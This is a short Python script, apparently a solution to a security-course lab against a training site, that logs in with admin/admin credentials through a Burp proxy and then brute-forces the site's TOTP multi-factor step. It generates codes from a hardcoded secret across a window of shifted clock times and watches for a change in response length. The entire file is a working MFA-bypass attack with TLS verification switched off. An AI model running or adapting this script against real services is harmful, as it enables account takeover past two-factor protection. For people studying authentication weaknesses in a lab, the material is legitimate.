import pyotp
import time
import requests
from urllib3.exceptions import InsecureRequestWarning
# Silences warnings about not verifying Burp's CA certificate.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

s = requests.session() # This session object saves our settings for the lifetime of the script.
s.verify = False # Skip trying to verify TLS certs, due to Burp's CA.
s.proxies = {"https": "http://127.0.0.1:8080"} # Proxy requests through Burp.



r = s.get("https://mfa-v2.quoccabank.com/login")
#print(r.text)

print("\ntrying to log in now...\n")

#post request to log in
login_res = s.post("https://mfa-v2.quoccabank.com/login", {"username": "admin", "password": "admin"})
#print(login_res.text)


#post request for MFA
print("\ntrying to verify MFA now...\n")
#admin link: otpauth://totp/mfa-v2:admin?secret=GBYHMZDVMVRVIV3YJ44G66LNPFRXG6LC

for hour in range(0,24):
    for minute in range(-5, 60):
        time.sleep(0.2)
        CurrentTime = time.mktime((time.localtime().tm_year,
                                time.localtime().tm_mon,
                                time.localtime().tm_mday,
                                time.localtime().tm_hour + hour,
                                time.localtime().tm_min + minute,
                                time.localtime().tm_sec,
                                time.localtime().tm_wday,
                                time.localtime().tm_yday,
                                time.localtime().tm_isdst))  # (year, month, day, hour, minute, second, weekday, Julian day, DST flag)
        TOTP = pyotp.TOTP('GBYHMZDVMVRVIV3YJ44G66LNPFRXG6LC').at(CurrentTime)
        print(f"sending TOTP: {TOTP}")

        #post request to log in
        login_res = s.post("https://mfa-v2.quoccabank.com/mfa", {"code": TOTP})
        if len(login_res.content) != 771:
            print(f"response for hour changed by:{hour},minute changed by:{minute} is:\n {login_res.content}")
            exit()
    print(f"up to hour: {hour}")